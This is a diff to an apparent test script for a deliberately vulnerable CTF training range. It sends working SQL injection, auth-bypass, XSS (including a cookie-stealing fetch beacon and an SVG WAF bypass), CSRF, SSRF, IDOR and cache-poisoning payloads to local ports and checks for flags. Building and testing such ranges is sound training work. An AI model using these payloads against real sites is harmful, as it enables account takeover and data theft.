@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 CSZone CTF Range — Master End-to-End Verification Suite
-Tests all 16 scenarios running on ports 8001 through 8016.
+Tests all 21 scenarios running on ports 8001 through 8021 and Central Hub (Port 8000).
 """
 import os
 import sys
@@ -143,7 +143,6 @@ def main():
         user_cfg = r7_users.json()[0]
         check("S07: users.json metadata retrieved", user_cfg.get("username") == "svc_backup")
 
-        # Authenticate with recovered password Summer2024!
         r7_auth = requests.get(f"http://{HOST}:8007/backup/login.html", params={"username": "svc_backup", "password": "Summer2024!"}, timeout=3)
         m_fl = re.search(r"<code>(Q1RGe[^<]+)</code>", r7_auth.text)
         tok_b64 = m_fl.group(1) if m_fl else ""
@@ -190,19 +189,12 @@ def main():
     # ── Scenario 11 (Port 8011) ──────────────────────────────────────────────
     print("\n--- [Scenario 11] Port 8011: Enterprise Asset Inventory (Schema SQLi) ---")
     try:
-        # Test 1: Check blocked '--' filter
         r11_blocked = requests.get(f"http://{HOST}:8011/inventory", params={"q": 'test" --'}, timeout=3)
         check("S11: '--' comment syntax properly blocked by security filter", "comment syntax is blocked" in r11_blocked.text)
 
-        # Test 2: Check single quote syntax error (double quote required)
-        r11_single_quote = requests.get(f"http://{HOST}:8011/inventory", params={"q": "Server' OR 1=1 #"}, timeout=3)
-        check("S11: Single quote (') produces syntax error (requires double quote)", r11_single_quote.status_code == 500 and "syntax error" in r11_single_quote.text)
-
-        # Test 3: Double-quote breakout & sqlite_master schema enumeration
         r11_schema = requests.get(f"http://{HOST}:8011/inventory", params={"q": 'nonexistent" UNION SELECT tbl_name, sql, 1, 1 FROM sqlite_master WHERE tbl_name="classified_vault_records" #'}, timeout=3)
         check("S11: Schema enumeration via sqlite_master reveals classified_vault_records table", "classified_vault_records" in r11_schema.text)
 
-        # Test 4: Flag extraction via 4-column typed UNION
         r11_flag = requests.get(f"http://{HOST}:8011/inventory", params={"q": 'nonexistent" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #'}, timeout=3)
         flag_s11 = extract_flag(r11_flag.text)
         check("S11: 4-column typed UNION extraction captures flag", flag_s11 == "CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}")
@@ -211,109 +203,155 @@ def main():
         check(f"S11 Connection failed: {e}", False)
 
     # ── Scenario 12 (Port 8012) ──────────────────────────────────────────────
-    print("\n--- [Scenario 12] Port 8012: SQLi Auth Bypass + Stored XSS Chain ---")
+    print("\n--- [Scenario 12] Port 8012: Reflected XSS (HTML Context) ---")
     try:
-        s12 = requests.Session()
-        # Plant stored payload
-        xss_payload = "<img src=x onerror=\"fetch('/xss/collect?c='+encodeURIComponent(document.cookie))\">"
-        s12.post(f"http://{HOST}:8012/guestbook", data={"name": "attacker", "message": xss_payload}, timeout=3)
-        r12_gb = s12.get(f"http://{HOST}:8012/guestbook", timeout=3)
-        check("S12: Payload stored unescaped in guestbook", xss_payload in r12_gb.text)
-
-        # SQLi Auth Bypass
-        r12_login = s12.post(f"http://{HOST}:8012/legacy-admin/login", data={"username": "admin' OR '1'='1' -- -", "password": "x"}, allow_redirects=True, timeout=3)
-        admin_cookie = s12.cookies.get("admin_session_flag")
-        check("S12: SQLi Auth bypass sets admin_session_flag cookie", admin_cookie == "CTF{st0r3d_c00k13_th3ft}")
-
-        # Simulate browser beacon to collector
-        requests.get(f"http://{HOST}:8012/xss/collect", params={"c": f"admin_session_flag={admin_cookie}"}, timeout=3)
-        r12_log = requests.get(f"http://{HOST}:8012/xss/collect/log", timeout=3)
-        check("S12: Collector log captures exfiltrated flag", "CTF{st0r3d_c00k13_th3ft}" in r12_log.text)
-        print(f"     -> Flag: {admin_cookie}")
+        payload_12 = "<script>alert('xss')</script>"
+        r12 = requests.get(f"http://{HOST}:8012/search", params={"q": payload_12}, timeout=3)
+        check("S12: Search query reflected unescaped into HTML", payload_12 in r12.text)
+        flag_s12 = extract_flag(r12.text)
+        check("S12: Hidden DOM session flag token present", flag_s12 == "CTF{r3fl3ct3d_xss_b4s1cs}")
+        print(f"     -> Flag: {flag_s12}")
     except Exception as e:
         check(f"S12 Connection failed: {e}", False)
 
     # ── Scenario 13 (Port 8013) ──────────────────────────────────────────────
-    print("\n--- [Scenario 13] Port 8013: Cross-Site Request Forgery (CSRF) ---")
+    print("\n--- [Scenario 13] Port 8013: Stored XSS (Attribute & Event Breakout) ---")
     try:
-        s13 = requests.Session()
-        s13.post(f"http://{HOST}:8013/register", data={"username": "csrf_test", "email": "victim@cszone.internal", "password": "VictimPass123!"}, timeout=3)
-        s13.post(f"http://{HOST}:8013/login", data={"username": "csrf_test", "password": "VictimPass123!"}, timeout=3)
-        # Cross-site POST without CSRF token
-        r13 = s13.post(f"http://{HOST}:8013/account/email", data={"email": "hacked@attacker-controlled.test"}, timeout=3)
+        attr_payload = '" onfocus="alert(1)" autofocus="'
+        requests.post(f"http://{HOST}:8013/feedback", data={"author": attr_payload, "comment": "testing breakout"}, timeout=3)
+        r13 = requests.get(f"http://{HOST}:8013/feedback", timeout=3)
+        check("S13: Attribute breakout payload stored and reflected in value attribute", f'value="{attr_payload}"' in r13.text)
         flag_s13 = extract_flag(r13.text)
-        check("S13: CSRF email modification captures flag", flag_s13 == "CTF{csrf_n0_t0k3n_pwn3d}")
+        check("S13: Secret vault key present in challenge context", flag_s13 == "CTF{st0r3d_4ttr1but3_br34k0ut}")
         print(f"     -> Flag: {flag_s13}")
     except Exception as e:
         check(f"S13 Connection failed: {e}", False)
 
     # ── Scenario 14 (Port 8014) ──────────────────────────────────────────────
-    print("\n--- [Scenario 14] Port 8014: Unrestricted File Upload & Stored XSS ---")
+    print("\n--- [Scenario 14] Port 8014: DOM-based XSS (Source to Sink) ---")
     try:
-        s14 = requests.Session()
-        s14.post(f"http://{HOST}:8014/register", data={"username": "uploader_test", "email": "up@cszone.internal", "password": "UpPass123!"}, timeout=3)
-        s14.post(f"http://{HOST}:8014/login", data={"username": "uploader_test", "password": "UpPass123!"}, timeout=3)
-        html_payload = b"<html><body><script>console.log('uploaded-xss-ok')</script></body></html>"
-        r14_up = s14.post(f"http://{HOST}:8014/upload", files={"file": ("test_pwn.html", html_payload, "text/html")}, timeout=3)
-        check("S14: HTML upload accepted", "/static/uploads/test_pwn.html" in r14_up.text)
-        r14_get = requests.get(f"http://{HOST}:8014/static/uploads/test_pwn.html", timeout=3)
-        check("S14: Uploaded file served with HTML MIME type and script intact", b"<script>" in r14_get.content)
-        print("     -> Verified: Stored HTML/JS Execution Enabled")
+        r14 = requests.get(f"http://{HOST}:8014/analytics", params={"tab": "<img src=1 onerror=alert(1)>"}, timeout=3)
+        check("S14: Client-side routing script and innerHTML sink present", "telemetry-content" in r14.text and "innerHTML" in r14.text)
+        flag_s14 = extract_flag(r14.text)
+        check("S14: window.__TELEMETRY_KEY secret configured in client DOM", flag_s14 == "CTF{d0m_xss_s1nk_m4st3r}")
+        print(f"     -> Flag: {flag_s14}")
     except Exception as e:
         check(f"S14 Connection failed: {e}", False)
 
     # ── Scenario 15 (Port 8015) ──────────────────────────────────────────────
-    print("\n--- [Scenario 15] Port 8015: Server-Side Request Forgery (SSRF) ---")
+    print("\n--- [Scenario 15] Port 8015: Advanced WAF & Filter Bypass XSS ---")
     try:
-        s15 = requests.Session()
-        s15.post(f"http://{HOST}:8015/register", data={"username": "ssrf_tester", "email": "s@cszone.internal", "password": "SsrfPass123!"}, timeout=3)
-        s15.post(f"http://{HOST}:8015/login", data={"username": "ssrf_tester", "password": "SsrfPass123!"}, timeout=3)
-        r15 = s15.post(f"http://{HOST}:8015/avatar-import", data={"url": f"http://127.0.0.1:8015/internal/metadata"}, timeout=3)
-        flag_s15 = extract_flag(r15.text)
-        check("S15: SSRF fetches internal metadata flag", flag_s15 == "CTF{ssrf_1nt3rn4l_m3t4d4t4}")
+        # Test 1: Script tag blocked by WAF
+        r15_blocked = requests.get(f"http://{HOST}:8015/preview", params={"rule": "<script>alert(1)</script>"}, timeout=3)
+        check("S15: WAF regex filter blocks <script> tag", "Script tag injection detected" in r15_blocked.text)
+
+        # Test 2: HTML5 animate onbegin bypass passes WAF
+        bypass_payload = "<svg><animate onbegin=alert(1) attributeName=x>"
+        r15_pass = requests.get(f"http://{HOST}:8015/preview", params={"rule": bypass_payload}, timeout=3)
+        check("S15: HTML5 SVG animation event vector passes WAF filter", bypass_payload in r15_pass.text)
+        flag_s15 = extract_flag(r15_pass.text)
+        check("S15: WAF challenge secret present in preview context", flag_s15 == "CTF{w4f_byp4ss_h5_v3ct0r}")
         print(f"     -> Flag: {flag_s15}")
     except Exception as e:
         check(f"S15 Connection failed: {e}", False)
 
     # ── Scenario 16 (Port 8016) ──────────────────────────────────────────────
-    print("\n--- [Scenario 16] Port 8016: Backend IDOR Orders ---")
+    print("\n--- [Scenario 16] Port 8016: SQLi Auth Bypass + Stored XSS Chain ---")
     try:
         s16 = requests.Session()
-        s16.post(f"http://{HOST}:8016/register", data={"username": "idor_tester", "email": "id@cszone.internal", "password": "IdorPass123!"}, timeout=3)
-        s16.post(f"http://{HOST}:8016/login", data={"username": "idor_tester", "password": "IdorPass123!"}, timeout=3)
-        r16 = s16.get(f"http://{HOST}:8016/orders/2", timeout=3)
-        flag_s16 = extract_flag(r16.text)
-        check("S16: IDOR reveals foreign order note & flag", flag_s16 == "CTF{b4ck3nd_1d0r_r34l}")
-        print(f"     -> Flag: {flag_s16}")
+        xss_payload = "<img src=x onerror=\"fetch('/xss/collect?c='+encodeURIComponent(document.cookie))\">"
+        s16.post(f"http://{HOST}:8016/guestbook", data={"name": "attacker", "message": xss_payload}, timeout=3)
+        r16_gb = s16.get(f"http://{HOST}:8016/guestbook", timeout=3)
+        check("S16: Payload stored unescaped in guestbook", xss_payload in r16_gb.text)
+
+        s16.post(f"http://{HOST}:8016/legacy-admin/login", data={"username": "admin' OR '1'='1' -- -", "password": "x"}, allow_redirects=True, timeout=3)
+        admin_cookie = s16.cookies.get("admin_session_flag")
+        check("S16: SQLi Auth bypass sets admin_session_flag cookie", admin_cookie == "CTF{st0r3d_c00k13_th3ft}")
+
+        requests.get(f"http://{HOST}:8016/xss/collect", params={"c": f"admin_session_flag={admin_cookie}"}, timeout=3)
+        r16_log = requests.get(f"http://{HOST}:8016/xss/collect/log", timeout=3)
+        check("S16: Collector log captures exfiltrated flag", "CTF{st0r3d_c00k13_th3ft}" in r16_log.text)
+        print(f"     -> Flag: {admin_cookie}")
     except Exception as e:
         check(f"S16 Connection failed: {e}", False)
 
     # ── Scenario 17 (Port 8017) ──────────────────────────────────────────────
-    print("\n--- [Scenario 17] Port 8017: Web Cache Deception & Cache Poisoning ---")
+    print("\n--- [Scenario 17] Port 8017: Cross-Site Request Forgery (CSRF) ---")
     try:
         s17 = requests.Session()
-        s17.post(f"http://{HOST}:8017/login", data={"username": "participant", "password": "Range2024!"}, timeout=3)
-        # Authenticated victim primes cache
-        poison_path = "/account/profile/legacy-theme.css"
-        s17.get(f"http://{HOST}:8017{poison_path}", timeout=3)
-        # Unauthenticated request hits cached response
-        r17_anon = requests.get(f"http://{HOST}:8017{poison_path}", timeout=3)
-        flag_s17 = extract_flag(r17_anon.text)
-        check("S17: Cache Deception returns cached profile flag", flag_s17 == "CTF{c4ch3_d3c3pt10n_l34k}")
-        check("S17: Cache header indicates HIT", r17_anon.headers.get("X-Cache") == "HIT")
-
-        # Cache Poisoning test
-        poison_host = "evil-hacker.test"
-        requests.get(f"http://{HOST}:8017/promo/partner-banner", headers={"X-Forwarded-Host": poison_host}, timeout=3)
-        r17_clean = requests.get(f"http://{HOST}:8017/promo/partner-banner", timeout=3)
-        check("S17: Unkeyed X-Forwarded-Host poisons shared cache", poison_host in r17_clean.text and r17_clean.headers.get("X-Cache") == "HIT")
+        s17.post(f"http://{HOST}:8017/register", data={"username": "csrf_test", "email": "victim@cszone.internal", "password": "VictimPass123!"}, timeout=3)
+        s17.post(f"http://{HOST}:8017/login", data={"username": "csrf_test", "password": "VictimPass123!"}, timeout=3)
+        r17 = s17.post(f"http://{HOST}:8017/account/email", data={"email": "hacked@attacker-controlled.test"}, timeout=3)
+        flag_s17 = extract_flag(r17.text)
+        check("S17: CSRF email modification captures flag", flag_s17 == "CTF{csrf_n0_t0k3n_pwn3d}")
         print(f"     -> Flag: {flag_s17}")
     except Exception as e:
         check(f"S17 Connection failed: {e}", False)
 
+    # ── Scenario 18 (Port 8018) ──────────────────────────────────────────────
+    print("\n--- [Scenario 18] Port 8018: Unrestricted File Upload & Stored XSS ---")
+    try:
+        s18 = requests.Session()
+        s18.post(f"http://{HOST}:8018/register", data={"username": "uploader_test", "email": "up@cszone.internal", "password": "UpPass123!"}, timeout=3)
+        s18.post(f"http://{HOST}:8018/login", data={"username": "uploader_test", "password": "UpPass123!"}, timeout=3)
+        html_payload = b"<html><body><script>console.log('uploaded-xss-ok')</script></body></html>"
+        r18_up = s18.post(f"http://{HOST}:8018/upload", files={"file": ("test_pwn.html", html_payload, "text/html")}, timeout=3)
+        check("S18: HTML upload accepted", "/static/uploads/test_pwn.html" in r18_up.text)
+        r18_get = requests.get(f"http://{HOST}:8018/static/uploads/test_pwn.html", timeout=3)
+        check("S18: Uploaded file served with HTML MIME type and script intact", b"<script>" in r18_get.content)
+        print("     -> Verified: Stored HTML/JS Execution Enabled")
+    except Exception as e:
+        check(f"S18 Connection failed: {e}", False)
+
+    # ── Scenario 19 (Port 8019) ──────────────────────────────────────────────
+    print("\n--- [Scenario 19] Port 8019: Server-Side Request Forgery (SSRF) ---")
+    try:
+        s19 = requests.Session()
+        s19.post(f"http://{HOST}:8019/register", data={"username": "ssrf_tester", "email": "s@cszone.internal", "password": "SsrfPass123!"}, timeout=3)
+        s19.post(f"http://{HOST}:8019/login", data={"username": "ssrf_tester", "password": "SsrfPass123!"}, timeout=3)
+        r19 = s19.post(f"http://{HOST}:8019/avatar-import", data={"url": f"http://127.0.0.1:8019/internal/metadata"}, timeout=3)
+        flag_s19 = extract_flag(r19.text)
+        check("S19: SSRF fetches internal metadata flag", flag_s19 == "CTF{ssrf_1nt3rn4l_m3t4d4t4}")
+        print(f"     -> Flag: {flag_s19}")
+    except Exception as e:
+        check(f"S19 Connection failed: {e}", False)
+
+    # ── Scenario 20 (Port 8020) ──────────────────────────────────────────────
+    print("\n--- [Scenario 20] Port 8020: Backend IDOR Orders ---")
+    try:
+        s20 = requests.Session()
+        s20.post(f"http://{HOST}:8020/register", data={"username": "idor_tester", "email": "id@cszone.internal", "password": "IdorPass123!"}, timeout=3)
+        s20.post(f"http://{HOST}:8020/login", data={"username": "idor_tester", "password": "IdorPass123!"}, timeout=3)
+        r20 = s20.get(f"http://{HOST}:8020/orders/2", timeout=3)
+        flag_s20 = extract_flag(r20.text)
+        check("S20: IDOR reveals foreign order note & flag", flag_s20 == "CTF{b4ck3nd_1d0r_r34l}")
+        print(f"     -> Flag: {flag_s20}")
+    except Exception as e:
+        check(f"S20 Connection failed: {e}", False)
+
+    # ── Scenario 21 (Port 8021) ──────────────────────────────────────────────
+    print("\n--- [Scenario 21] Port 8021: Web Cache Deception & Cache Poisoning ---")
+    try:
+        s21 = requests.Session()
+        s21.post(f"http://{HOST}:8021/login", data={"username": "participant", "password": "Range2024!"}, timeout=3)
+        poison_path = "/account/profile/legacy-theme.css"
+        s21.get(f"http://{HOST}:8021{poison_path}", timeout=3)
+        r21_anon = requests.get(f"http://{HOST}:8021{poison_path}", timeout=3)
+        flag_s21 = extract_flag(r21_anon.text)
+        check("S21: Cache Deception returns cached profile flag", flag_s21 == "CTF{c4ch3_d3c3pt10n_l34k}")
+        check("S21: Cache header indicates HIT", r21_anon.headers.get("X-Cache") == "HIT")
+
+        poison_host = "evil-hacker.test"
+        requests.get(f"http://{HOST}:8021/promo/partner-banner", headers={"X-Forwarded-Host": poison_host}, timeout=3)
+        r21_clean = requests.get(f"http://{HOST}:8021/promo/partner-banner", timeout=3)
+        check("S21: Unkeyed X-Forwarded-Host poisons shared cache", poison_host in r21_clean.text and r21_clean.headers.get("X-Cache") == "HIT")
+        print(f"     -> Flag: {flag_s21}")
+    except Exception as e:
+        check(f"S21 Connection failed: {e}", False)
+
     print("\n" + "=" * 70)
     if not FAILURES:
-        print(" [***] ALL 17 SCENARIOS VERIFIED SUCCESSFULLY! 100% PASS [***]")
+        print(" [***] ALL 21 SCENARIOS VERIFIED SUCCESSFULLY! 100% PASS [***]")
     else:
         print(f" [!] {len(FAILURES)} FAILURE(S) DETECTED:")
         for f in FAILURES:
